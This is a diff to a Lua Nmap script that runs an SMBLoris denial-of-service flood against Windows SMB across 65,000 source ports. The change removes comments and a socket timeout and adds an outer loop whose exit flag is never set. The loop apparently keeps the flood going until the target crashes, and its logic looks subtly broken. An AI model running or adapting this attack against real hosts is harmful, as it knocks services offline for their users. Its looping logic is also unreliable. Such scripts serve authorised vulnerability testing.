@@ -89,7 +89,7 @@ end
 
 local host_down = false
 local TIMEOUT = 1000 -- number of seconds to timeout the attack
-local skts = {} -- prevent garbage collection
+local skts = {}
 local CRITICAL_VALUE_99 = 3.3
 local SMBLORIS_PAYLOAD = '\x00\x01\xff\xff'
 
@@ -168,14 +168,11 @@ local function send_dos(host, port, src_port)
   end
 
   local oldsocket = skts[src_port]
-  -- the below doesn't work when num ports is at 65000 because
-  -- of some Lua sorcery where the sockets will disappear and have no value
   if oldsocket then
     oldsocket:close()
   end
 
   local socket = nmap.new_socket()
-  socket:set_timeout(86400000) -- one day in milliseconds
 
   local try = nmap.new_try()
 
@@ -230,19 +227,22 @@ All modern versions of Windows, at least from Windows 2000 through Windows 10, a
   end
 
   stdnse.debug1("Mean: %s, 99%% interval: ± %s", mean, ci)
+  local timed_out = false
+  while not timed_out or not host_down do
     -- using 65000 instead of 65535 prevents crash of too many files open
-  for i=1, 65000, 1 do
-    send_dos( host, port, i)
+    for i=1, 65000, 1 do
+      send_dos(host, port, i)
 
-    if i % 1000 == 0 and i <= 60000 then
-      -- prevents crash when i >= 61000
-      check_alive(host, mean, ci)
-    end
+      if i % 1000 == 0 and i <= 60000 then
+        -- prevents crash when i >= 61000
+        check_alive(host, mean, ci)
+      end
 
-    -- has it timed out yet?
-    if nmap.clock() - timeout >= script_start then
-      stdnse.debug1("Script timed out at %s", timeout)
-      break
+      -- has it timed out yet?
+      if nmap.clock() - timeout >= script_start then
+        stdnse.debug1("Script timed out at %s", timeout)
+        break
+      end
     end
   end
   if host_down then
